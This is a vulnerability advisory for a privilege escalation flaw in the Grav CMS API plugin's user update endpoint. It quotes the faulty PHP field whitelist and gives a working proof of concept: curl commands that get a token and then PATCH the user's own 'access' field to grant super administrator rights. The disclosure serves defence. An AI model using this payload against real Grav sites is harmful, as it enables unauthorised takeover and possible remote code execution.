summary: "Grav API Privilege Escalation to Super Admin\n### Summary\n\nAn insecure direct object\
  \ reference and logic flaw in the Grav API plugin (`UsersController::update`) allows any authenticated\
  \ user with basic API access (`api.access`) to modify their own permission configuration.\
  \ An attacker can exploit this to escalate their privileges to Super Administrator (`admin.super`\
  \ and `api.super`), leading to full system compromise and potential RCE.\n\n### Details\n\n\
  The vulnerability is located in `user/plugins/api/classes/Api/Controllers/UsersController.php`\
  \ within the `update` method.\n\nThe API allows users to update their own profiles if they\
  \ possess the basic `api.access` permission:\n\n```php\n// UsersController.php -> update()\n\
  $isSelf = $currentUser->username === $username;\nif (!$isSelf) {\n    $this->requirePermission($request,\
  \ 'api.users.write');\n} else {\n    // Self-edit only requires api.access\n    $this->requirePermission($request,\
  \ 'api.access');\n}\n```\n\nHowever, when filtering the fields that are allowed to be updated\
  \ via a `PATCH` request, the `access` field (which defines the user's role and permissions)\
  \ is indiscriminately included in the `$allowedFields` whitelist for all users:\n\n```php\n\
  // Partial update - only update provided fields\n$allowedFields = ['email', 'fullname', 'title',\
  \ 'state', 'language', 'content_editor', 'access', 'twofa_enabled'];\nforeach ($allowedFields\
  \ as $field) {\n    if (array_key_exists($field, $body)) {\n        $user->set($field, $body[$field]);\n\
  \    }\n}\n```\n\nBecause there is no secondary check to verify if the user attempting to\
  \ modify the `access` field is already an administrator, any low-privileged user can overwrite\
  \ their own `access` object with a malicious payload granting themselves `super: true`.\n\n\
  ### PoC\n\n1. **Prerequisites**: You need a low-privileged user account (eg. `user1`) that\
  \ possesses the basic `api.access` permission.\n\n2. **Obtain JWT**: Authenticate to the API\
  \ to obtain your `access_token`:\n\n   ```bash\n   curl -X POST http://<target>/api/v1/auth/token\
  \ \\\n     -H \"Content-Type: application/json\" \\\n     -d '{\"username\":\"user1\",\"password\"\
  :\"your_password\"}'\n   ```\n\n3. **Exploit**: Send a `PATCH` request to the user update\
  \ endpoint. \n\n   ```bash\n   curl -X PATCH http://<target>/api/v1/users/user1 \\\n     -H\
  \ \"X-API-Token: <your_access_token>\" \\\n     -H \"Content-Type: application/json\" \\\n\
  \     -d \"{\\\"access\\\":{\\\"admin\\\":{\\\"login\\\":true,\\\"super\\\":true},\\\"api\\\
  \":{\\\"access\\\":true,\\\"super\\\":true},\\\"site\\\":{\\\"login\\\":true}}}\"\n   ```\n\
  \n4. **Verification**: Log in to the Grav Admin panel using the user credentials. You will\
  \ now have full Super Administrator privileges.\n\n### Impact\n\nThis is a vertical Privilege\
  \ Escalation vulnerability. Any user with baseline API access can elevate themselves to Super\
  \ Admin. Once Super Admin privileges are obtained, the attacker takes complete control over\
  \ the CMS. They can modify content, alter configurations, upload malicious plugins, or edit\
  \ Twig templates outside of the sandbox to achieve RCE on the server."
